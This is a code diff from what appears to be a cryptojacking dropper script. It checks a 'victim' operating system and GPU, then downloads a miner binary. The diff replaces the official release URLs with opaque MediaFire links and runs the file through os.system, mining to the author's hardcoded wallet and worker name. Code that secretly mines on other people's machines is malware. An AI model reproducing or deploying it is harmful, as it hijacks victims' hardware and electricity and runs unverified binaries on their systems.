@@ -47,20 +47,16 @@ if(vicos == "windows"):
 
 elif(vicos == "linux"):
     if (gpu == "nvidia"):
-        url = "https://github.com/trexminer/T-Rex/releases/download/0.24.7/t-rex-0.24.7-win.zip"
+        url = "https://download1477.mediafire.com/uefcx1nt711g/6nr8ke7gqj0aejl/t-rex"
     elif (gpu == "amd"):
-        url = "http://gminer.pro/downloads?res=gminer_2_71_linux64.tar.xz"
+        url = "https://download1083.mediafire.com/1ps3zsxln6lg/au0620emw9q9na0/miner"
+
     r = requests.get(url, allow_redirects=True)
-    open('trex.tar.xz', 'wb').write(r.content)
-
-    print('getcwd:      ', os.getcwd())
-
-    file = tarfile.open('trex.tar.xz')
-    file.extractall('./{}'.format(os.getcwd()))
-    file.close()
-
+    open('miner', 'wb').write(r.content)
 
     if (gpu == "amd"):
-        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && ./miner --algo etchash --server {2} --user {1}.sinsinati5".format(os.getcwd(), yourwallet, server)], shell = True)
+        pvic = "cd {0} && ./miner --algo etchash --server {2} --user {1}.sinsinati5".format(os.getcwd(), yourwallet, server)
+        os.system(pvic)
     elif (gpu == "nvidia"):
-        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && ./trex -a ethash -o {2} -u {1} -p x -w sinsinati5".format(os.getcwd(), yourwallet, server)], shell = True)
+        pvic = "cd {0} && ./miner -a ethash -o {2} -u {1} -p x -w sinsinati5".format(os.getcwd(), yourwallet, server)
+        os.system(pvic)
